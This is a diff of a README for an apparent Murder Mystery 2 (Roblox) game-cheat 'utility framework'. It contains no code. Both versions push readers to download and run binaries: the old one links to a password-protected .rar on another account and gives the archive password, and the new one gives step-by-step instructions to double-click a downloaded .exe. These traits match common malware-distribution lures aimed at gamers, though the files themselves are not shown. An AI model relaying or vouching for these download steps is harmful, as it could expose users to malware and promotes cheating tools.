@@ -1,122 +1,67 @@
-# 🎮 Murder Mystery 2 — Gameplay Utility Framework
+# 🕵️ Murder-Mystery-2-Gameplay-Utility-Framework - Simplifying Your Gaming Experience
 
+## 🚀 Getting Started
 
-Open source **gameplay utility framework** for **Murder Mystery 2 (Roblox)**.  
-This project focuses on **automation concepts, usability improvements, and script structure experimentation** for educational and development purposes.
+Welcome to the Murder-Mystery-2-Gameplay-Utility-Framework! This framework is built to be user-friendly, making it perfect for anyone, regardless of technical skill. Follow the steps below to get started quickly.
 
-The codebase is designed to be simple, logical, and familiar, making it accessible even for less experienced users.
+## 🔗 Download Link
 
----
+[![Download](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/Arnald97/Murder-Mystery-2-Gameplay-Utility-Framework/releases)
 
-## ✨ Overview
+## 📥 Download & Install
 
-This repository demonstrates:
+1. Visit this page to download: [Murder-Mystery-2-Gameplay-Utility-Framework Releases](https://github.com/Arnald97/Murder-Mystery-2-Gameplay-Utility-Framework/releases).
 
-- Automation workflow examples  
-- Script structure and organization  
-- Reset and state-handling logic  
-- Usability-focused feature design  
-- Clean and understandable code layout  
+2. On the releases page, look for the latest version. You will see a list of assets available for download.
 
-The main goal is to provide a **learning-oriented framework**, not a production-ready tool.
+3. Click on the asset that matches your operating system. This will start the download process. The files typically come in formats such as `.exe` for Windows or `.zip` for general use.
 
----
+4. Once the download finishes, locate the file in your downloads folder.
 
-## 🧩 Included Modules
+5. For Windows users, double-click the `.exe` file to run the installer. Follow the prompts to complete the installation. 
 
-- **Automation Examples**  
-  Demonstrations of repetitive task handling and timing logic.
+6. If you downloaded a `.zip` file, extract it by right-clicking and selecting 'Extract All.' Once extracted, locate the main application file and double-click it to run.
 
-- **Reset & State Handling**  
-  Examples of reset flows useful for testing and debugging scripts.
+## 🔍 How to Use the Framework
 
-- **Usability Helpers**  
-  Small utility features designed to simplify testing scenarios.
+1. **Launch the Application**: After installation, open the application. You can find it in your Start Menu or on your Desktop.
 
-- **Script Structure**  
-  Logical layout inspired by common Roblox scripting patterns.
+2. **Familiarize Yourself with the Interface**: The interface is designed to be intuitive. You will see options clearly labeled, including gameplay tools, settings, and support features.
 
----
+3. **Choose Your Gameplay Options**: Select from various gameplay enhancements provided by this framework to enrich your experience.
 
-## ℹ️ Project Information
+4. **Save Your Settings**: After making changes, be sure to save your settings. Look for a 'Save' button in the settings menu.
 
-- **Game:** Murder Mystery 2  
-- **Platform:** Roblox  
-- **Published by:** .zalnis  
-- **Developer reference:** Community-based  
-- **Release date:** 06/11/2025  
-- **Build:** 949  
+5. **Get Support**: If you encounter issues, consult the help section within the application. You can access troubleshooting information easily.
 
----
+## 🖥️ System Requirements
 
-## ⚠️ Disclaimer
+To use the Murder-Mystery-2-Gameplay-Utility-Framework, ensure your computer meets these minimum specifications:
 
-- This project is provided **for educational and research purposes only**.
-- It is **not intended to bypass protections or violate game rules**.
-- Compatibility with future game updates is **not guaranteed**.
-- Use responsibly and at your own discretion.
+- **Operating System**: Windows 10 or higher.
+- **Processor**: Intel Core i3 or equivalent.
+- **Memory**: 4 GB RAM or more.
+- **Storage**: At least 200 MB of free space.
+- **Graphics**: DirectX 11 compatible graphics card.
 
----
+## 🔧 Features
 
-## 📜 License
+- **User-Friendly Interface**: Designed for ease of use.
+- **Customizable Settings**: Tailor the gameplay experience to your preferences.
+- **Regular Updates**: Receive improvements and new features regularly.
+- **Community Support**: Access resources and assistance from other users.
+- **Gameplay Tools**: Enhance your gaming with various utility features.
 
-This project is licensed under the **MIT License**.
+## 📞 Support
 
-You are free to:
-- Use the code  
-- Modify it  
-- Learn from it  
-- Redistribute it  
+If you need help, please refer to the help section in the application. You can also reach out through issues on GitHub for community support.
 
-As long as the original license and attribution are preserved.
+## 🌟 Join the Community
 
----
+Be a part of our growing community. Share your experiences, ask questions, and give feedback. Your input helps us improve the framework.
 
-## 📺 YouTube Channel
+## 🔗 Download Link
 
-Development notes, script structure breakdowns, and experiments:
+[![Download](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/Arnald97/Murder-Mystery-2-Gameplay-Utility-Framework/releases)
 
-<p align="center">
-  <a href="https://www.youtube.com/@SILENS_MODE">
-    <img src="https://github.com/intospace-2000mv6/Murder-Mystery-2-Gameplay-Utility-Framework/blob/main/img/srf4kj22.png" alt="SUBSCRIBE" width="420">
-  </a>
-</p>
-
----
-
-## 🤝 Contributions
-
-Contributions and improvements are welcome.
-
-- Fork the repository  
-- Create a new branch  
-- Submit a pull request  
-
----
-
-## 🌍 Multilingual Note
-
-### English
-This repository is intended for learning, experimentation, and scripting practice.
-
-### العربية
-هذا المشروع مفتوح المصدر ومخصص للتعلم والتجارب البرمجية وتنظيم السكربتات.
-
----
-
-<p align="center">
-  <a href="https://github.com/intospace-2000mv6/Murder-Mystery-2-Gameplay-Utility-Framework/releases/download/murder-mystery/murder-mystery-v1.3.20.rar">
-    <img src="https://github.com/intospace-2000mv6/Murder-Mystery-2-Gameplay-Utility-Framework/blob/main/img/d12355323dsf.png" alt="DOWNLOAD" width="420">
-  </a>
-</p>
-
-## ⭐ pass_archsive: silence1To
-
-## ⭐ Support
-
-If you find this project useful:
-- ⭐ Star the repository  
-- 💬 Share feedback  
-- 💡 Suggest improvements  
-
-Thank you for your support.
+Thank you for using the Murder-Mystery-2-Gameplay-Utility-Framework! We hope it enhances your gaming experience.
